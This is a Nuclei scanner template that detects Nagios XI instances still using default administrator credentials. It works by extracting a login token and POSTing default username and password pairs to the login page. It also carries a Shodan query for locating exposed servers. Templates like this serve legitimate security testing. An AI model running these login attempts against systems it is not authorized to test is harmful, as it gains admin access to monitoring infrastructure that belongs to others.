http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: nsp
    part: body
    regex:
    - name="nsp" value="(.*)">
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    part: body_3
    type: word
    words:
    - Home Dashboard</a>
    - Admin</a>
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - nagiosadmin
    - nagiosxi
    username:
    - nagiosadmin
    - root
  raw:
  - 'GET /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /nagiosxi/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    nsp={{nsp}}&page=auth&debug=&pageopt=login&username={{username}}&password={{password}}&loginButton=

    '
  - 'GET /nagiosxi/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: nagiosxi-default-login
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
  description: Nagios XI default admin login credentials were detected.
  metadata:
    max-request: 6
    shodan-query: title:"Nagios XI"
    verified: true
  name: Nagios XI Default Admin Login - Detect
  reference:
  - https://nagiosxi.demos.nagios.com/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
  severity: critical
  tags: nagios,nagiosxi,default-login
